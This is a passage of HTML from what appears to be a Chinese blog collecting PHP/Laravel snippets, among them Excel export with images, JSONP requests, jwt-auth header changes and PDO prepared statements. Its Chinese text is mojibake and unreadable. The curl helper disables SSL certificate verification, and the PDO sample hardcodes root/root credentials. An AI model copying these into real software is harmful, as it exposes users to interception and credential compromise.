class="line">           $sheet-&gt;setCellValue(<span class="string">'C'</span> . $k, $value[<span class="string">'answer'</span>]);</span><br><span class="line"></span><br><span class="line">           $img = self::curlGet($value[<span class="string">'img'</span>]);</span><br><span class="line">           $dir = public_path(<span class="string">'/temp/image/'</span>);</span><br><span class="line">           $file_info = pathinfo($value[<span class="string">'img'</span>]);</span><br><span class="line">           <span class="keyword">if</span> (!empty($file_info[<span class="string">'basename'</span>])) &#123; <span class="comment">//è¿‡æ»¤éæ–‡ä»¶ç±»å‹</span></span><br><span class="line">               $basename = $file_info[<span class="string">'basename'</span>];</span><br><span class="line">               is_dir($dir) OR mkdir($dir, <span class="number">0777</span>, <span class="literal">true</span>); <span class="comment">//è¿›è¡Œæ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">               file_put_contents($dir . $basename, $img);</span><br><span class="line"></span><br><span class="line">               $drawing[$k] = <span class="keyword">new</span> Drawing();</span><br><span class="line">               $drawing[$k]-&gt;setName(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setDescription(<span class="string">'Logo'</span>);</span><br><span class="line">               $drawing[$k]-&gt;setPath($dir . $basename);</span><br><span class="line">               $drawing[$k]-&gt;setWidth(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setHeight(<span class="number">80</span>);</span><br><span class="line">               $drawing[$k]-&gt;setCoordinates(<span class="string">'D'</span>.$k);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetX(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setOffsetY(<span class="number">12</span>);</span><br><span class="line">               $drawing[$k]-&gt;setWorksheet($spreadsheet-&gt;getActiveSheet());</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               $sheet-&gt;setCellValue(<span class="string">'D'</span> . $k, <span class="string">''</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           $sheet-&gt;getRowDimension($k)-&gt;setRowHeight(<span class="number">80</span>);</span><br><span class="line">           $k++;</span><br><span class="line">       &#125;</span><br><span class="line">       $file_name = date(<span class="string">'Y-m-d'</span>, time()) . rand(<span class="number">1000</span>, <span class="number">9999</span>);</span><br><span class="line">       <span class="comment">//  ç¬¬ä¸€ç§ä¿å­˜æ–¹å¼</span></span><br><span class="line">       <span class="comment">/*$writer = new Xlsx($spreadsheet);</span></span><br><span class="line"><span class="comment">       //ä¿å­˜çš„è·¯å¾„å¯è‡ªè¡Œè®¾ç½®</span></span><br><span class="line"><span class="comment">       $file_name = '../'.$file_name . ".xlsx";</span></span><br><span class="line"><span class="comment">       $writer-&gt;save($file_name);*/</span></span><br><span class="line">       <span class="comment">//  ç¬¬äºŒç§ç›´æ¥é¡µé¢ä¸Šæ˜¾ç¤ºä¸‹è½½</span></span><br><span class="line">       $file_name = $file_name . <span class="string">".xls"</span>;</span><br><span class="line">       header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line">       header(<span class="string">'Content-Disposition: attachment;filename="'</span> . $file_name . <span class="string">'"'</span>);</span><br><span class="line">       header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line">       $writer = IOFactory::createWriter($spreadsheet, <span class="string">'Xls'</span>);</span><br><span class="line">       <span class="comment">//  æ³¨æ„createWriter($spreadsheet, 'Xls') ç¬¬äºŒä¸ªå‚æ•°é¦–å­—æ¯å¿…é¡»å¤§å†™</span></span><br><span class="line">       $writer-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">getClient</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       $client = <span class="keyword">new</span> Client();</span><br><span class="line">       <span class="keyword">return</span> $client;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">curlGet</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $ch = curl_init();</span><br><span class="line">       curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">       curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// è¿™ä¸ªæ˜¯é‡ç‚¹ è¯·æ±‚httpsã€‚</span></span><br><span class="line">       $data = curl_exec($ch);</span><br><span class="line">       curl_close($ch);</span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-é›†åˆçš„-â€œwhenâ€-æ–¹æ³•"><a href="#Laravel-é›†åˆçš„-â€œwhenâ€-æ–¹æ³•" class="headerlink" title="Laravel é›†åˆçš„ â€œwhenâ€ æ–¹æ³•"></a>Laravel é›†åˆçš„ â€œwhenâ€ æ–¹æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$hosts = [</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Eric Barnes'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jack Fruh'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Jacob Bennett'</span>, <span class="string">'location'</span> =&gt; <span class="string">'USA'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">    [<span class="string">'name'</span> =&gt; <span class="string">'Michael Dyrynda'</span>, <span class="string">'location'</span> =&gt; <span class="string">'AU'</span>, <span class="string">'is_active'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">];</span><br><span class="line">ä»¥å¾€ï¼Œå¦‚æœåœ¨ä¸€ä¸ªæŸ¥è¯¢è¯­å¥ä¸Šï¼Œè¿˜è¦æœ‰è¿›ä¸€æ­¥çš„è¿‡æ»¤æ¡ä»¶ï¼Œä½ å¯èƒ½éœ€è¦è¿™æ ·å†™ï¼š</span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)-&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (request(<span class="string">'retired'</span>)) &#123;</span><br><span class="line">    $inUsa = $inUsa-&gt;filter(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ! $employee[<span class="string">'is_active'</span>];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">é€šè¿‡ when æ–¹æ³•ï¼Œä½ å°±å¯ä»¥åœ¨ä¸€ä¸ªé“¾å¼æŸ¥è¯¢ä¸­å®Œæˆæ‰€æœ‰çš„ç­›é€‰è¿‡æ»¤ï¼šhttps:<span class="comment">//learnku.com/laravel/t/26331</span></span><br><span class="line"></span><br><span class="line">$inUsa = collect($hosts)</span><br><span class="line">    -&gt;where(<span class="string">'location'</span>, <span class="string">'USA'</span>)</span><br><span class="line">    -&gt;when(request(<span class="string">'retired'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">$collection</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $collection-&gt;reject(<span class="function"><span class="keyword">function</span>(<span class="params">$employee</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> $employee[<span class="string">'is_active'</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Jwtauth-è‡ªå®šä¹‰è®¤è¯å¤´ä¿¡æ¯"><a href="#Jwtauth-è‡ªå®šä¹‰è®¤è¯å¤´ä¿¡æ¯" class="headerlink" title="Jwtauth è‡ªå®šä¹‰è®¤è¯å¤´ä¿¡æ¯"></a>Jwtauth è‡ªå®šä¹‰è®¤è¯å¤´ä¿¡æ¯</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">é¡¹ç›®ä½¿ç”¨çš„ tymon/jwt-auth åŒ…ä½œä¸º token çš„è®¤è¯ï¼Œè¿‡ç¨‹ä¸­éœ€è¦è¿ç§»é¡¹ç›®ï¼Œå› ä¸ºä¹‹å‰å…¬å¸çš„ token å¤´éƒ¨ä½¿ç”¨è‡ªå®šä¹‰çš„ï¼Œå¹¶ä¸”ä»–ä»¬è¿˜ä¿®æ”¹äº†åŒ…çš„å¤´ä¿¡æ¯ã€‚å°±æ˜¯ä¸‹é¢å¤´éƒ¨ä¿¡æ¯ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26976</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthHeaders</span> <span class="title">implements</span> <span class="title">ParserContract</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ä¸‹é¢è¿™ä¸¤å¤„å°±æ˜¯è¢«ä¿®æ”¹çš„</span></span><br><span class="line">    protected $header = <span class="string">'authorization'</span>; </span><br><span class="line"></span><br><span class="line">    protected $prefix = <span class="string">'bearer'</span>;</span><br><span class="line">&#125;</span><br><span class="line">è¿ç§»é¡¹ç›®è¿‡ç¨‹äº†ï¼Œå› ä¸ºæ‹‰å–äº†æ–°çš„åŒ…ï¼Œæ‰€ä»¥è¿˜è¦å»åŠ¨åŒ…çš„ä¿¡æ¯ï¼Œè¿™æ˜¯æå…¶ä¸åˆç†çš„è¡Œä¸ºã€‚æ‰€ä»¥å°±åœ¨åŒ…ä¸­å°è¯•æ‰¾åˆ°äº†æ›´å¥½çš„è§£å†³åŠæ³•ã€‚å¦‚æœåœ¨é¡¹ç›®è¿ç§»è¿‡ç¨‹ä¸­é‡åˆ°äº†ç±»ä¼¼çš„é—®é¢˜è¯¥å¦‚ä½•å»åšå‘¢ï¼Ÿè¿™é‡Œåªæä¾›äº†æˆ‘èƒ½æƒ³åˆ°çš„è§£å†³åŠæ³•ã€‚éœ€è¦åœ¨ AppServiceProvider ä¸­åŠ å…¥è¯¥æ–¹æ³•å°±å¯ä»¥äº†ã€‚</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">setAuthHeader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $chain = $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;getChain();</span><br><span class="line"></span><br><span class="line">        $chain[<span class="number">0</span>] = $chain[<span class="number">0</span>]-&gt;setHeaderPrefix(<span class="string">'é¡¹ç›®çš„ token å‰ç¼€'</span>)-&gt;setHeaderName(<span class="string">'é¡¹ç›®çš„å¤´ä¿¡æ¯ key'</span>);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;app[<span class="string">'tymon.jwt.parser'</span>]-&gt;setChain($chain);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ajax-å®ç°è·¨åŸŸ"><a href="#ajax-å®ç°è·¨åŸŸ" class="headerlink" title="ajax å®ç°è·¨åŸŸ"></a>ajax å®ç°è·¨åŸŸ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">                <span class="keyword">async</span>: <span class="literal">true</span>,</span><br><span class="line">                url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">                type: <span class="string">"GET"</span>,</span><br><span class="line">                dataType: <span class="string">"jsonp"</span>, <span class="comment">// è¿”å›çš„æ•°æ®ç±»å‹ï¼Œè®¾ç½®ä¸ºJSONPæ–¹å¼</span></span><br><span class="line">                jsonp: <span class="string">'callback'</span>, <span class="comment">//æŒ‡å®šä¸€ä¸ªæŸ¥è¯¢å‚æ•°åç§°æ¥è¦†ç›–é»˜è®¤çš„ jsonp å›è°ƒå‚æ•°å callback</span></span><br><span class="line">                jsonpCallback: <span class="string">'handleResponse'</span>, <span class="comment">//è®¾ç½®å›è°ƒå‡½æ•°å</span></span><br><span class="line">                success: <span class="function"><span class="keyword">function</span> (<span class="params">response, status, xhr</span>) </span>&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'çŠ¶æ€ä¸ºï¼š'</span> + status + <span class="string">',çŠ¶æ€æ˜¯ï¼š'</span> + xhr.statusText);</span><br><span class="line">                    <span class="built_in">console</span>.log(response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">åŸç”Ÿ js å®ç°è·¨åŸŸ</span><br><span class="line"></span><br><span class="line"> <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">jsonp</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//å®šä¹‰ä¸€ä¸ªå¤„ç†Jsonpè¿”å›æ•°æ®çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">            <span class="built_in">window</span>[<span class="string">"callback"</span>] = <span class="function"><span class="keyword">function</span> (<span class="params">object</span>) </span>&#123;</span><br><span class="line">                obj.success(object);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">            <span class="comment">//ç»„åˆè¯·æ±‚URL</span></span><br><span class="line">            script.src = obj.url + <span class="string">"?callback=callback"</span>;</span><br><span class="line">            <span class="keyword">for</span> (key <span class="keyword">in</span> obj.data) &#123;</span><br><span class="line">                script.src += <span class="string">"&amp;"</span> + key + <span class="string">"="</span> + obj.data[key];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//å°†åˆ›å»ºçš„æ–°èŠ‚ç‚¹æ·»åŠ åˆ°BOMæ ‘ä¸Š</span></span><br><span class="line">            <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild(script);</span><br><span class="line">        &#125;</span><br><span class="line">        jsonp(&#123;</span><br><span class="line">            url: <span class="string">"http://172.16.112.3/api.php"</span>,</span><br><span class="line">            success: <span class="function"><span class="keyword">function</span> (<span class="params">obj</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="PDO-é˜²æ­¢-sql-æ³¨å…¥"><a href="#PDO-é˜²æ­¢-sql-æ³¨å…¥" class="headerlink" title="PDO é˜²æ­¢ sql æ³¨å…¥"></a>PDO é˜²æ­¢ sql æ³¨å…¥</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setAttributeï¼ˆï¼‰ è¿™ä¸€è¡Œæ˜¯å¼ºåˆ¶æ€§çš„ï¼Œå®ƒä¼šå‘Šè¯‰ PDO ç¦ç”¨æ¨¡æ‹Ÿé¢„å¤„ç†è¯­å¥ï¼Œå¹¶ä½¿ç”¨ real parepared statements ã€‚è¿™å¯ä»¥ç¡®ä¿ SQL è¯­å¥å’Œç›¸åº”çš„å€¼åœ¨ä¼ é€’åˆ° mysql æœåŠ¡å™¨ä¹‹å‰æ˜¯ä¸ä¼šè¢« PHP è§£æçš„ï¼ˆç¦æ­¢äº†æ‰€æœ‰å¯èƒ½çš„æ¶æ„ SQL æ³¨å…¥æ”»å‡»ï¼‰ã€‚è™½ç„¶ä½ å¯ä»¥é…ç½®æ–‡ä»¶ä¸­è®¾ç½® å­—ç¬¦é›†çš„å±æ€§ (charset=utf8)ï¼Œä½†æ˜¯éœ€è¦æ ¼å¤–æ³¨æ„çš„æ˜¯ï¼Œè€ç‰ˆæœ¬çš„ PHPï¼ˆ &lt; <span class="number">5.3</span><span class="number">.6</span>ï¼‰åœ¨ DSN ä¸­æ˜¯å¿½ç•¥å­—ç¬¦å‚æ•°çš„ã€‚</span><br><span class="line">æˆ‘ä»¬æ¥çœ‹ä¸€æ®µå®Œæ•´çš„ä»£ç ä½¿ç”¨å®ä¾‹ï¼šhttps:<span class="comment">//learnku.com/articles/27000#topnav</span></span><br><span class="line"></span><br><span class="line">  $user=$_POST[<span class="string">'user'</span>]; $pass=$_POST[<span class="string">'pass'</span>];</span><br><span class="line">  $dbh = <span class="keyword">new</span> \PDO(<span class="string">"mysql:host=localhost; dbname=zz"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">  $dbh-&gt;setAttribute(\PDO::ATTR_EMULATE_PREPARES, <span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//ç¦ç”¨prepared statementsçš„ä»¿çœŸæ•ˆæœ</span></span><br><span class="line"><span class="comment">//        $dbh-&gt;exec    ("set names 'utf8'");</span></span><br><span class="line">  $sql=<span class="string">"select * from test where user=? and pass=?"</span>;</span><br><span class="line">  $stmt = $dbh-&gt;prepare($sql);</span><br><span class="line">  $exeres = $stmt-&gt;execute(array($user, $pass));</span><br><span class="line">  <span class="keyword">if</span> ($exeres) &#123;</span><br><span class="line">  <span class="comment">//whileæ¡ä»¶ä¸ºçœŸæ—¶,è¾“å‡º$row,</span></span><br><span class="line">  <span class="keyword">while</span></span><br><span class="line">  ($row = $stmt-&gt;fetch(\PDO::FETCH_ASSOC))&#123;</span><br><span class="line">  print_r($row);die();</span><br><span class="line"> &#125;  <span class="comment">//å¤±è´¥è¾“å‡ºç™»å½•å¤±è´¥</span></span><br><span class="line">  print_r(<span class="string">"ç™»å½•å¤±è´¥"</span>);die();</span><br><span class="line"> &#125;</span><br><span class="line">å½“è°ƒç”¨ prepare () æ—¶ï¼ŒæŸ¥è¯¢è¯­å¥å·²ç»å‘é€ç»™äº†æ•°æ®åº“æœåŠ¡å™¨ï¼Œæ­¤æ—¶åªæœ‰å ä½ç¬¦ï¼Ÿå‘é€è¿‡å»ï¼Œæ²¡æœ‰ç”¨æˆ·æäº¤çš„æ•°æ®ï¼›å½“è°ƒç”¨åˆ° execute () æ—¶ï¼Œç”¨æˆ·æäº¤è¿‡æ¥çš„å€¼æ‰ä¼šä¼ é€ç»™æ•°æ®åº“ï¼Œä»–ä»¬æ˜¯åˆ†å¼€ä¼ é€çš„ï¼Œä¸¤è€…ç‹¬ç«‹çš„ï¼ŒSQL æ”»å‡»è€…æ²¡æœ‰ä¸€ç‚¹æœºä¼šã€‚</span><br></pre></td></tr></table></figure>
<h3 id="Eloquent-å…³ç³»ä¸­ä½¿ç”¨-orderBy"><a href="#Eloquent-å…³ç³»ä¸­ä½¿ç”¨-orderBy" class="headerlink" title="Eloquent å…³ç³»ä¸­ä½¿ç”¨ orderBy()"></a>Eloquent å…³ç³»ä¸­ä½¿ç”¨ orderBy()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">productsByName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(Product::<span class="class"><span class="keyword">class</span>)-&gt;<span class="title">orderBy</span>('<span class="title">name</span>')</span>;</span><br><span class="line">&#125;</span><br><span class="line">$products = Product::whereDate(<span class="string">'created_at'</span>, <span class="string">'2018-01-31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereMonth(<span class="string">'created_at'</span>, <span class="string">'12'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereDay(<span class="string">'created_at'</span>, <span class="string">'31'</span>)-&gt;get(); </span><br><span class="line">$products = Product::whereYear(<span class="string">'created_at'</span>, date(<span class="string">'Y'</span>))-&gt;get(); </span><br><span class="line">$products = Product::whereTime(<span class="string">'created_at'</span>, <span class="string">'='</span>, <span class="string">'14:13:58'</span>)-&gt;get();</span><br><span class="line">Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'account'</span>, <span class="string">'as'</span> =&gt; <span class="string">'account.'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::get(<span class="string">'login'</span>, <span class="string">'AccountController@login'</span>);     </span><br><span class="line">    Route::get(<span class="string">'register'</span>, <span class="string">'AccountController@register'</span>);</span><br><span class="line">    Route::group([<span class="string">'middleware'</span> =&gt; <span class="string">'auth'</span>], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;         </span><br><span class="line">        Route::get(<span class="string">'edit'</span>, <span class="string">'AccountController@edit'</span>);     </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">æ¢å¤å¤šä¸ªè½¯åˆ é™¤https:<span class="comment">//learnku.com/articles/26673 </span></span><br><span class="line"></span><br><span class="line">å¦‚æœè®°å½•ä½¿ç”¨äº†è½¯åˆ é™¤ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥ä¸€æ¬¡æ¢å¤å¤šæ¡è½¯åˆ é™¤è®°å½•ã€‚</span><br><span class="line"></span><br><span class="line">Post::withTrashed()-&gt;where(<span class="string">'author_id'</span>, <span class="number">1</span>)-&gt;restore();</span><br><span class="line"><span class="comment">// Author -&gt; hasMany(Book::class) </span></span><br><span class="line">$authors = Author::has(<span class="string">'books'</span>, <span class="string">'&gt;'</span>, <span class="number">5</span>)-&gt;get();</span><br><span class="line">$users = User::all([<span class="string">'id'</span>, <span class="string">'name'</span>, <span class="string">'email'</span>]);</span><br><span class="line">åœ¨æ‰§è¡Œ Eloqument æŸ¥è¯¢åï¼Œä½ å¯ä»¥ä½¿ç”¨ map() æ¥ä¿®æ”¹è¡Œã€‚</span><br><span class="line"></span><br><span class="line">$users = User::where(<span class="string">'role_id'</span>, <span class="number">1</span>)-&gt;get()-&gt;map(<span class="function"><span class="keyword">function</span> (<span class="params">User $user</span>) </span>&#123;</span><br><span class="line">    $user-&gt;some_column = some_function($user);</span><br><span class="line">    <span class="keyword">return</span> $user;</span><br><span class="line">&#125;);</span><br><span class="line">å½“ä¸€ä¸ªå…³ç³»è¢«è°ƒç”¨æ—¶ï¼Œå¦‚æœå®ƒä¸å­˜åœ¨ï¼Œåˆ™ä¼šå‡ºç°è‡´å‘½çš„é”™è¯¯ï¼Œä¾‹å¦‚ $post-&gt;user-&gt;name ï¼Œå¯ä»¥ä½¿ç”¨ withDefault() æ¥é¿å…ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">/** è·å–æ–‡ç« ä½œè€… */</span> </span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">user</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;belongsTo(<span class="string">'App\User'</span>)-&gt;withDefault(); </span><br><span class="line">&#125;</span><br><span class="line">$users = App\Book::<span class="keyword">with</span>(<span class="string">'author:id,name'</span>)-&gt;get();</span><br></pre></td></tr></table></figure>
<h3 id="å¼€é—­åŸåˆ™"><a href="#å¼€é—­åŸåˆ™" class="headerlink" title="å¼€é—­åŸåˆ™"></a>å¼€é—­åŸåˆ™</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ã€€Controller ç±»ï¼Œåªæ¥å—ç”¨æˆ·è¾“å…¥ï¼Œè¿”å›è¾“å‡ºï¼Œä¸éœ€è¦å…·ä½“å¤„ç†èƒŒåçš„äº‹æƒ…ã€‚å½“éœ€è¦è¡¨å•éªŒè¯çš„æ—¶å€™ï¼Œæ³¨å…¥ç›¸åº”çš„ Request ç±»ã€‚å½“éœ€è¦æ•°æ®æ“ä½œæ—¶ï¼Œæ³¨å…¥ç›¸åº”çš„ Repository æˆ– Service æˆ– Factoryã€‚</span><br><span class="line"></span><br><span class="line">ã€€ã€€Model ç±»ï¼Œå°†ä¿®æ”¹å™¨ï¼Œè®¿é—®å™¨å®šä¹‰åœ¨ trait ç„¶å use è¿›æ¥ã€‚æ•°æ®æ“ä½œé€»è¾‘åˆ†ç¦»æˆ Repositoryã€‚</span><br><span class="line"></span><br><span class="line">ã€€ã€€Helper.php å…¨å±€å‡½æ•°ï¼Œå°†åŒç±»å‹çš„ helper åˆ†ç¦»æˆå•ç‹¬çš„æ–‡ä»¶ï¼Œä½¿å…¶é«˜å†…èšã€‚ç„¶ååœ¨ Helper.php ä¸­å¼•å…¥</span><br><span class="line">æ‰€æœ‰å…·ä½“çš„ç±»éƒ½éœ€è¦å®ç° Interface ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚</span><br><span class="line">åœ¨ Factory ä¸­å®ä¾‹åŒ–å…·ä½“çš„ç±»ã€‚</span><br><span class="line">åœ¨ Controller ä¸­ä½¿ç”¨ Factoryã€‚</span><br><span class="line"></span><br><span class="line">é¦–å…ˆåˆ›å»ºä¸€ä¸ª PaymentInterfaceï¼Œä»»ä½•æ”¯ä»˜æ–¹å¼éƒ½å¿…é¡»å®ç°æ­¤æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚</span><br><span class="line"></span><br><span class="line">interface PaymentInterface &#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function">æ¥ç€ï¼Œåˆ›å»ºä¸¤ä¸ªå®ç° <span class="title">PaymentInterface</span> çš„å…·ä½“ç±»ã€‚</span></span><br><span class="line"><span class="function"></span></span><br><span 